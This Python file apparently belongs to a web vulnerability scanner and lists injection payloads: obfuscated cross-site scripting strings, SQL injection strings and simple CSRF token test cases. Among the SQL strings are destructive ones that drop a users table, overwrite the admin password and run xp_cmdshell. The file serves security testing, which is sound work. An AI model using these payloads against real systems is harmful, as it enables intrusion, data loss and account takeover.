# payloads.py

PAYLOADS = {
    "xss": [
        "<script>alert('XSS')</script>",
        "'\"><img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "\"'><iframe src='javascript:alert(1)'></iframe>",
        "%3Cscript%3Ealert('XSS')%3C/script%3E",  # URL encoded
        "<body onload=alert(1)>",
        "<math><mi//xlink:href='javascript:alert(1)'>",
        "'';!--\"<XSS>=&{()}",

        # Event handlers
        "<img src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<object data=\"data:text/html,<script>alert(1)</script>\"></object>",

        # Encoded and obfuscated payloads
        "<svg><desc><![CDATA[</desc><script>alert(1)//]]></script>",
        "<iframe srcdoc=\"&lt;svg onload=alert('XSS')&gt;\"></iframe>",
        "<img src=javascript:alert('XSS')>",
        "<img src=x onerror=\"window.onerror=null;alert(1)\">",
        "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></iframe>",

        # CSS injection
        "<div style=\"width:expression(alert('XSS'));\">",

        # Meta refresh
        "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",

        # Complex encoded payloads
        "\\\"><svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>",
        "%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E",

        # Unicode escapes
        "<img src=x onerror=\\u0061lert('XSS')>",

        # Data URIs
        "<script src=\"data:text/javascript,alert('XSS');\"></script>",

        # DOM-based XSS variants
        "<body onmessage=print()>",
        "<body onpagereveal=alert(1)>",
    ],

    "sqli": [
        "' OR '1'='1--",
        "\" OR \"1\"=\"1\"--",
        "' OR 1=1--",
        "' OR '1'='1' /*",
        "'; WAITFOR DELAY '0:0:5'--",
        "' UNION SELECT NULL--",
        "' OR SLEEP(5) --",
        "\" OR '1'='1'--",
        "' OR 'a'='a",
        "\" OR 1=1#",
        "'; EXEC xp_cmdshell('ping 127.0.0.1')--",
        "'; DROP TABLE users; --",
        "' OR EXISTS(SELECT * FROM users) --",
        "\"; UPDATE users SET password='hacked' WHERE username='admin' --",
    ],

    "csrf": [
        {"test_type": "missing_token"},
        {"test_type": "invalid_token", "token_value": "fake_token"},
        {"test_type": "empty_token", "token_value": ""},
        # Additional CSRF test cases can be scripted here
    ],
}
